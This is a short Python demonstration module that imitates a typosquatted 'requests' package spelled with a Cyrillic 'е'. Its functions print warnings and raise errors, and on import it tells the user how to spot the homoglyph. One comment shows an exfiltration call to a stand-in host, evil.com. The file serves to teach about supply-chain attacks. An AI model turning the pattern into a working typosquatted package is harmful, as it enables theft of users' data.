# DEMO: Malicious wrapper intercepting all HTTP requests
import sys

def get(*args, **kwargs):
    print(f"⚠️  INTERCEPTED: GET {args[0] if args else ''}")
    print(f"📡 Exfiltrating to evil.com...")
    # Real malware would: urllib.request.urlopen('https://evil.com/log', data=...)
    raise RuntimeError("DEMO: This is a malicious typosquatted package!")

def post(*args, **kwargs):
    print(f"⚠️  INTERCEPTED: POST {args[0] if args else ''}")
    print(f"📡 Stealing your data...")
    raise RuntimeError("DEMO: This is a malicious typosquatted package!")

# Intercept all common functions
request = get
Request = None
Session = None

print("\n🚨 WARNING: You imported the MALICIOUS 'requеsts' package (Cyrillic е)")
print("🔍 Check with: python -c \"print('requеsts'[3])\" # Shows Cyrillic")
print("✅ Real package: requests (Latin e)\n")
